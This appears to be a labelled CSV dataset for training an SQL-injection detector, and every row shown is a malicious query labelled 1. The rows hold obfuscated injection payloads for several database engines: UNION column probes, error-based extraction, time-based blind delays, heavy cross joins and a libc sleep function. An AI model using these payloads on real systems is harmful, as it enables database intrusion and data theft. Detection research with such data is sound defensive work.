Query,Label
"-5763'   )    )     )   %un%%i%o%%n all %sel%%e%c%t 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",1
se%l%e%%c%%t   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  se%l%e%%c%%t 6652 f%%r%%o%m info%%rmation_schema.character_%%sets  )   end  )  #,1
-4173'  )   o%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s%el%%e%%ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %a%%n%d   (  'jdwt' %%l%%ik%%e 'jdwt,1
"1'   )    )    %a%nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %a%nd    (    (   'bemh'  =  'bemh",1
"1%"" o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%e%%le%%c%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%an%%d ""%""  =  """,1
"1'+  (  s%%el%ect 'tzyz' whe%%re 4912  =  4912 or 6979  =  %l%ike  (  'abcdefg',upper  (  hex  (  r%a%n%%domblob  (  500000000/2   )    )      )    )   --",1
"1   )    )     )   %and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  %%se%%le%ct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    %and    (    (     (  1205  =  1205",1
"1'  )   %o%%r 8421  =    (  s%el%ec%%t count  (  *  )   %f%r%o%%m generate_series  (  1,5000000   )    )   ",1
"1""  )   as kuuf %whe%r%%e 6908  =  6908",1
-6661'   )    )    %o%r 2724 %%in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%elec%%t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %and    (    (   'tbmu' %%lik%e 'tbmu,1
1'   )    )    as wjfj w%%h%e%%r%%e 3802  =  3802,1
"1""  )   %%a%nd 6240  =    (  'qqpjq'||  (  s%el%e%%c%%t case 6240 when 6240 then 1 else 0 end %f%%r%%om rdb$da%%t%%a%%bas%%e  )  ||'qzvzq'  )   %%a%nd   (  ""xsfg"" lik%e ""xsfg",1
-2516  )   wher%%e 3349  =  3349 %o%r 4855  =  1806--,1
"1""   )    )     )   %u%n%io%%n all %s%%e%%le%%c%t %nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l#",1
1'  )   as xqbq %w%%he%%re 1619  =  1619 a%nd 6240  =    (  'qqpjq'||  (  %%s%%elec%t case 6240 when 6240 then 1 else 0 end %%f%%r%o%%m rdb$dat%%a%b%ase  )  ||'qzvzq'  )  --,1
"-2782"" %%u%n%i%%o%n all %%s%%e%%l%%e%c%t 2109,2109,2109#",1
1'  )   as irck %%w%%h%e%%r%%e 3660  =  3660 o%%r   (  %s%%e%l%%e%%ct * %%f%r%om   (  %s%%e%l%%e%%ct  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1"" %%an%%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1'+  (  %s%%ele%c%%t 'vedi' w%he%re 2774  =  2774 %a%%n%d 9660  =    (  %s%%ele%c%%t count  (  *  )   fro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'  )   %wh%e%%r%e 6408  =  6408,1
"1%'   )    )     )   %%a%n%%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%lec%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %%f%%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%n%%d    (    (     (  '%'  =  '",1
"-3230""   )    )    as kbxc wh%%e%re 5007  =  5007 %o%r 2107  =  8818",1
1'  )   %an%d   (  3020  =  3020  )  *6703 %an%d   (  'lhfa'  =  'lhfa,1
"1""   )    )    %or row  (  1045,7562  )  >  (  s%%e%le%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%%e%le%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%or  (  ra%%nd  (  0  )  *2   )    )   x %fr%%om   (  s%%e%le%c%%t 8488 uni%on s%%e%le%c%%t 5584 uni%on s%%e%le%c%%t 3051 uni%on s%%e%le%c%%t 1210  )  a group %b%y x  )   a%%nd    (    (   ""aall"" %l%%i%%ke ""aall",1
1'||  (  se%le%%ct 'dyuw' %f%%r%%o%%m dual %w%%he%r%%e 2037  =  2037,1
"-5181""   )    )     )   %%o%%r elt  (  1032  =  1032,3623  )   %%an%%d    (    (     (  ""qofp""  =  ""qofp",1
"-2838"" w%%h%e%r%%e 5442  =  5442 %%u%%n%%i%%on all %%s%%el%%e%%c%%t 5442#",1
"1""  )   as lexx %%whe%re 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1""  )   %w%h%e%%r%%e 6072  =  6072 %%a%nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1'   )    )    %%or 4411  =    (  %%s%%e%%le%c%%t count  (  *  )   f%%r%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tpcm' %l%i%%ke 'tpcm",1
"1' %wh%e%%r%e 6905  =  6905 u%%n%i%%o%%n all sele%ct %n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l#",1
"1'  )   %o%%r   (  %sel%%e%%c%t 9173 f%%r%%o%%m  (  %sel%%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %sel%%e%%c%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%%a%%n%%d  (  0  )  *2   )    )   x f%%r%%o%%m %i%%nf%o%%rmation_schema.character_sets group %b%y x  )  a  )   %%a%%n%%d   (  'iwkg'  =  'iwkg",1
"1"" a%%nd 4996  =  4431 a%%nd ""jzaq""  =  ""jzaq",1
"1'  )   %w%he%r%%e 7007  =  7007 %%o%%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""   )    )    as czzg %whe%re 5483  =  5483 %an%%d exp  (  ~  (  %s%el%ect * f%%r%o%m   (  %s%el%ect concat  (  0x7171706a71,  (  %s%el%ect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1'   )    )    %%o%r exp  (  ~  (  %%se%%l%e%%c%%t * f%%rom   (  %%se%%l%e%%c%%t concat  (  0x7171706a71,  (  %%se%%l%e%%c%%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a%%n%d    (    (   'lgcw'  =  'lgcw",1
"1%'   )    )     )   %%or   (  %%s%%e%l%%ect 2*  (  if   (    (   %%s%%e%l%%ect * %f%%r%o%%m   (  %%s%%e%l%%ect concat  (  0x7171706a71,  (  %%s%%e%l%%ect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %and    (    (     (  '%'  =  '",1
"1""  )   as cfed %%wh%%er%%e 8220  =  8220 %u%nio%%n all s%e%le%%ct %%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l#",1
-8876'   )    )    %%or 3038  =  3038,1
"-1593' %or elt  (  7044  =  6125,6125  )   %a%n%%d 'zkuz'  =  'zkuz",1
"1' %a%%n%d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   %a%%n%d 'dubu' l%%ike 'dubu",1
"1'  )   %%w%%h%%e%r%%e 6388  =  6388 %%or 7417  =    (  %s%%e%%l%e%%ct count  (  *  )   f%%ro%m sysibm.sys%t%a%%bles as t1,sysibm.sys%t%a%%bles as t2,sysibm.sys%t%a%%bles as t3  )  --",1
"1'   )    )    %%a%n%%d 8407  =    (  s%%elec%t count  (  *  )   f%r%%om generate_series  (  1,5000000   )    )    %%a%n%%d    (    (   'lwyo'  =  'lwyo",1
1 %%w%h%%er%e 8532  =  8532,1
"-8790'  )   %%o%%r 1570  =  convert  (  %%i%nt,  (  %%s%ele%%c%%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%ele%%c%%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %a%%n%d   (  'nsze' %%l%i%k%e 'nsze",1
"-9023%""   )    )     )   %%u%n%%i%on all s%e%le%ct 4490,4490,4490#",1
"1%"" a%n%d make_%%s%%e%%t  (  2905  =  5725,5725  )   a%n%d ""%""  =  """,1
"1   )    )     )    (  %s%el%%e%c%t   (  case when   (  5451  =  5451  )   then regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,%n%ul%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr%o%m %%i%nfo%rmation_schema.system_users  )   a%n%%d    (    (     (  3023  =  3023",1
"1"" %o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    a%n%%d ""xbft""  =  ""xbft",1
"1"" %%o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,n%ul%l  )  --",1
"-4615'   )    )     )   %o%%r elt  (  1032  =  1032,3623  )   %a%n%%d    (    (     (  'jipk' %l%%i%k%e 'jipk",1
"1""   )    )     )   %an%%d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,%n%u%l%%l  )   %an%%d    (    (     (  ""uqyb""  =  ""uqyb",1
"1  )   %w%h%er%%e 9724  =  9724 %o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%n%ul%%l  )  --",1
"-2149""   )    )     )   %or elt  (  1032  =  1032,3623  )   %%and    (    (     (  ""hoon"" l%%i%ke ""hoon",1
"-4513""   )    )     )   o%r 4144  =    (  se%%l%%e%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%%l%%e%c%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %f%%r%om dual  )   %%an%d    (    (     (  ""gytb""  =  ""gytb",1
"1 %%o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%u%%ll  )  # tcrm",1
"1""   )    )     )   o%%r 7417  =    (  %s%%el%e%c%%t count  (  *  )   f%%r%%o%m sysibm.sys%%tab%l%%es as t1,sysibm.sys%%tab%l%%es as t2,sysibm.sys%%tab%l%%es as t3  )  --",1
waitf%%o%%r delay '0:0:5' %%a%%n%d   (  4614  =  4614,1
"1'  )   as bxae %w%%he%%r%%e 4143  =  4143 %o%%r %u%%pd%a%%t%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%%e%%l%%e%%ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
"1' %a%%n%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %a%%n%d 'vmuj' l%ik%e 'vmuj",1
"1'   )    )    %%an%%d elt  (  1210  =  1210,sleep  (  5   )    )    %%an%%d    (    (   'zizo' l%%ik%%e 'zizo",1
1 a%n%%d sleep  (  5  ) ,1
"-5595""   )    )    as xttj %%w%%h%%e%%re 4562  =  4562 %%u%n%i%%on all %%sel%ec%%t 4562,4562,4562,4562,4562#",1
"1""  )   %%u%n%%io%%n all %s%%e%l%ect %nu%%l%l--",1
1' %wh%er%%e 1692  =  1692,1
"1  )   %%o%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1  )   %w%h%%e%%re 5333  =  5333 %or 9643  =    (  %s%%e%%l%e%c%t count  (  *  )   %%f%%r%o%m doma%%i%n.doma%%i%ns as t1,doma%%i%n.columns as t2,doma%%i%n.%t%%a%%bl%es as t3  )  --",1
"sel%%e%%c%%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   %%fr%%o%%m dual %a%n%d   (  'hmsu'  =  'hmsu",1
1   )    )     )   a%%n%%d 6969  =    (  %s%ele%%c%%t 6969 %%f%%rom pg_sleep  (  5   )    )    a%%n%%d    (    (     (  5333  =  5333,1
"1,  (  %s%%e%l%%e%c%t   (  case when   (  5141  =  5141  )   then   (  %as%%cii  (  regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu%l%l  )  ,0  )  ,500000000  )  ,nu%l%l   )    )     )   else 5141/  (  %s%%e%l%%e%c%t 0 %fr%%om   (  %%v%al%u%%e%%s  (  0   )    )     )   end  )   %fr%%om   (  %%v%al%u%%e%%s  (  0   )    )     )  ",1
"1"" wh%e%r%%e 6686  =  6686 %or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'||  (  %s%e%%le%%ct 'pnsw' %%w%%her%%e 2103  =  2103 %un%%i%o%n all %s%e%%le%%ct n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l--",1
"1'+  (  se%%l%%e%c%t vvet w%h%e%%r%e 5221  =  5221 %a%%nd exp  (  ~  (  se%%l%%e%c%t * fr%o%%m   (  se%%l%%e%c%t concat  (  0x7171706a71,  (  se%%l%%e%c%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"1 a%%nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,n%u%ll  )  # jcdh",1
1'  )   as gxfu %%w%h%e%%r%e 9676  =  9676,1
"1' %%wher%e 2025  =  2025 %a%n%d 6414  =    (  %s%%el%ec%%t count  (  *  )   %%f%r%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-3297' %%o%%r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%l%%e%c%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1   )    )    %%o%r 8384  =  l%ike  (  'abcdefg',upper  (  hex  (  r%a%ndomblob  (  500000000/2   )    )      )    )    %a%nd    (    (   6829  =  6829",1
"-5231%"" or 4945  =  8402#",1
1'  )   as yqld %w%he%r%e 2489  =  2489,1
1' a%%n%%d sleep  (  5  )   a%%n%%d 'pfgy'  =  'pfgy,1
"-5160'  )   %%unio%n all s%ele%%c%t 8067,8067,8067,8067,8067,8067,8067--",1
"1'   )    )    as eleh wh%%ere 1347  =  1347 %%o%%r 8421  =    (  se%l%%e%%c%t count  (  *  )   %%f%r%%o%m generate_series  (  1,5000000   )    )   --",1
"-8205' or elt  (  6581  =  3480,3480  )   %%a%%n%%d 'sosv'  =  'sosv",1
"1""   )    )    as dooq %%w%he%re 7911  =  7911",1
"-6965'  )   %u%%n%i%%on all s%%e%%le%%c%t 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",1
1'   )    )    as yefv %wh%%er%e 4263  =  4263,1
"1%""  )   %%an%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %%an%d   (  ""%""  =  """,1
1'+  (  s%el%ect bfeq %w%%h%e%%r%e 3445  =  3445 a%%n%d 9198  =  9198--,1
"-6870""  )   as deox %%wh%er%e 8198  =  8198 %un%%io%%n all %%s%%e%l%%e%c%%t 8198#",1
"1 %%w%h%%e%%r%%e 2031  =  2031 %%o%%r 5356  =    (  %%s%e%%l%e%%c%t count  (  *  )   %%f%r%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-6020'+  (  %se%%l%e%c%%t %isrz w%%h%%e%%r%%e 2489  =  2489 %%u%n%io%n all %se%%l%e%c%%t 2489,2489,2489,2489,2489,2489,2489,2489--",1
"1%'   )    )    %%u%n%i%%o%n all %s%e%l%e%ct n%%u%l%%l,n%%u%l%%l--",1
 (  %%se%l%%ec%t   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  %%se%l%%ec%t 1421 %%f%ro%%m master..sysd%%at%aba%%ses  )   end   )    ) ,1
1' %%wher%%e 9206  =  9206,1
1'+  (  %%s%%el%e%%c%t tafk w%h%%e%%r%e 9652  =  9652,1
"1',iif  (  4861  =  6268,1,1/0  )  ",1
"%se%l%%e%c%%t count  (  *  )   f%%r%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %%a%n%%d    (    (     (  'pshn' l%%i%%k%e 'pshn",1
"1'+  (  %%s%%e%l%%e%%c%t 'zkum' %%w%her%%e 5161  =  5161 %%un%%i%%o%%n all %%s%%e%l%%e%%c%t %n%u%%l%l,%n%u%%l%l,%n%u%%l%l,%n%u%%l%l#",1
"1'||  (  %sele%c%%t 'dpce' %%f%ro%m dual %%w%%h%e%re 5261  =  5261 u%%ni%%o%n all %sele%c%%t %n%%u%l%%l,%n%%u%l%%l,%n%%u%l%%l,%n%%u%l%%l,%n%%u%l%%l,%n%%u%l%%l--",1
"-9445  )   as dmur wh%er%e 4371  =  4371 %u%n%%i%on all %se%l%%ec%%t 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
-9660   )    )    %o%r 9762  =  9698,1
"1 w%%h%e%re 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    %a%%n%%d 4386  =  utl_%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%le%c%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %a%%n%%d    (    (   ""bfko""  =  ""bfko",1
"%%se%l%%e%%c%t count  (  *  )   %fr%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 a%n%d   (  ""%""  =  """,1
"1   )    )    as midl %w%h%%e%re 9046  =  9046 %a%n%d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
1'   )    )    o%%r 6793  =    (  s%%e%%le%c%%t 6793 %%fr%o%m pg_sleep  (  5   )    )    %a%%n%d    (    (   'qiau'  =  'qiau,1
1 w%%h%%er%%e 9393  =  9393 waitf%%o%r delay '0:0:5'--,1
"s%e%l%%e%c%t count  (  *  )   fr%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",1
"1%' %%u%n%i%on all s%%e%l%%ec%%t n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l#",1
"1%"" %a%n%d sleep  (  5  )  #",1
"1%'  )   %and 9660  =    (  %se%l%%e%%ct count  (  *  )   %f%%r%%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   %%a%%nd '%'  =  '",1
"-4869%' %uni%%o%%n all %s%e%l%%e%ct 5729,5729,5729--",1
"1'  )   %a%n%%d make_%s%e%t  (  8403  =  8403,8899  )  ",1
-8463   )    )     )   o%r 4861  =  9834#,1
"1%'  )   %o%r %%u%%p%d%atexml  (  1808,concat  (  0x2e,0x7171706a71,  (  %%s%%e%%lec%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %and   (  '%'  =  '",1
"1'  )   %%w%%h%e%%r%e 8252  =  8252 %%o%%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1   )    )    %u%%n%%i%o%%n all %s%%e%l%%ec%%t n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l#",1
-3867%'  )   or 3084  =  5633 %a%n%%d   (  '%'  =  ',1
"%c%r%%e%%at%%e %or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict",1
-7565%'  )   %or 2724 %%i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%%el%ec%%t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %%and   (  '%'  =  ',1
%s%e%%l%e%%c%%t   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  %s%e%%l%e%%c%%t 0  )   end  )  --,1
-2456'   )    )     )   %%o%%r   (  8459  =  8459  )  *4906 %%an%d    (    (     (  'bbkp'  =  'bbkp,1
"1%""   )    )    %%and 3580  =    (  %%se%l%e%%ct count  (  *  )   %f%ro%%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%t%%ab%%l%%es as t3  )  --",1
"1""   )    )     )   r%l%i%k%%e   (  s%el%%ec%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    %a%%n%d    (    (     (  ""text"" %l%i%k%%e ""text",1
"-2364'+  (  %s%e%%l%e%%c%%t 'qdut' %whe%%r%e 7560  =  7560 %%u%%nio%%n all %s%e%%l%e%%c%%t 7560,7560,7560,7560,7560--",1
"1'   )    )    %a%n%d 6510  =    (  s%%e%%l%%e%ct count  (  *  )   %f%ro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %a%n%d    (    (   'uadr' %%li%k%%e 'uadr",1
"1%'  )   %o%r 8315  =    (  %s%%e%l%%e%c%t count  (  *  )   %fr%om sysibm.sys%%ta%b%%les as t1,sysibm.sys%%ta%b%%les as t2,sysibm.sys%%ta%b%%les as t3  )   %an%%d   (  '%'  =  '",1
-1354   )    )    or 8571  =  8571--,1
"1'  )   %a%%nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-7743"" %%or 9323  =  9323#",1
"-9928""   )    )    u%n%%ion all s%e%l%ec%t 7511,7511,7511,7511,7511,7511,7511,7511#",1
"1  )   %w%he%r%%e 9213  =  9213 %an%%d 8189  =    (  %%s%e%%l%%e%c%%t count  (  *  )   %%from sysibm.sys%%t%a%b%%l%%es as t1,sysibm.sys%%t%a%b%%l%%es as t2,sysibm.sys%%t%a%b%%l%%es as t3  )  --",1
1'||  (  sel%%e%c%%t 'ghb%%y' %%fro%m dual %w%he%%re 4854  =  4854,1
-4032'  )   %w%%h%%ere 5157  =  5157 %%o%r 1809  =  2810#,1
"1""   )    )    a%%nd elt  (  4249  =  4249,7259  )   a%%nd    (    (   ""abcm"" %%l%i%k%e ""abcm",1
1'  )   %%o%%r sleep  (  5  )   a%%n%%d   (  'kgbm'  =  'kgbm,1
"1'||  (  %se%%l%%e%%ct 'eils' %wh%%e%r%%e 8308  =  8308 o%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1 %%o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%ull  )  -- xsob",1
1  )   %w%he%%r%%e 2307  =  2307,1
"1""  )   as ifgl %%w%%her%%e 2190  =  2190 r%%l%%i%ke   (  s%%e%%l%%ec%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
-8999'   )    )     )   o%%r 6872  =  6872 %%a%n%d    (    (     (  'jare'  =  'jare,1
"-1254"" %o%%r 4144  =    (  s%ele%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%ele%c%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %fr%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %fr%%om dual  )  ",1
"1' in boolean mode  )   %%a%%n%d elt  (  9630  =  4765,4765  )  #",1
"1%"" rli%ke   (  s%el%e%%c%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a%n%d ""%""  =  """,1
"1'  )   u%%ni%o%n all %%selec%t %%n%ull,%%n%ull,%%n%ull--",1
"1' in boolean mode  )   %%or   (  s%%e%%l%%e%c%t 9173 f%rom  (  s%%e%%l%%e%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%%e%%l%%e%c%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%%or  (  r%%a%%n%d  (  0  )  *2   )    )   x f%rom inf%%ormation_schema.character_%s%%e%%ts group %%b%y x  )  a  )  #",1
"-1988 w%h%%er%e 4597  =  4597 %un%%ion all s%e%le%c%t 4597,4597,4597,4597,4597,4597--",1
"-4923"" %o%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %se%%le%c%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %%a%n%d ""afjc"" %l%%i%%k%%e ""afjc",1
"1'  )   %a%n%%d make_s%%et  (  6488  =  5525,5525  )  ",1
1' %%i%%n boolean mode  )   %%u%%n%%i%o%%n all %s%%e%%l%%ect null#,1
